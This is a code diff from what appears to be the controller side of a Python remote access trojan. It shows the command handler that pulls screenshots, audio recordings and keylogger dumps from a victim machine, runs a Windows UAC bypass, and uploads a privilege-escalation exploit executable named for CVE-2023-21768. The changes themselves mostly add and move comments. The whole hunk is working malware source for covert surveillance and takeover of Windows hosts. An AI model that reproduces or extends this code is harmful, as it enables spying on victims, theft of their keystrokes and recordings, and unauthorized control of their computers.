@@ -49,29 +49,33 @@ def target_communication():
             download_file(command[9:])
         elif command[:6] == 'upload':
             upload_file(command[7:])
+         #Desktop screenshot and audio record   
         elif command == 'screenshot':
             print(client[0].recv(1024).decode())
             download_file('screen.png')
             print("[+] Screenshot saved as screen.png")
+            
         elif command == 'record_audio':
             print(client[0].recv(1024).decode())  # Acknowledge
             download_file('recording.wav')
             print("[+] Audio saved as recording.wav")
+            
+        #keylogger    
         elif command == 'keylog_dump':
             result = reliable_recv()
             print("\n[+] Keylogger Output:\n" + result + "\n")
             
-        # Privilege escalation commands
+        #testing
         elif command == 'check_admin':
             result = reliable_recv()
             print(result)
         elif command == 'win11_wsreset_bypass':
             result = reliable_recv()
             print(result)
-        
         elif command == 'pid':
             result = reliable_recv()
             print(result)
+        # Privilege escalation commands
         elif command == 'uac':
             upload_file('Windows_AFD_LPE_CVE-2023-21768_x64.exe')
             print("[+] uploaded")
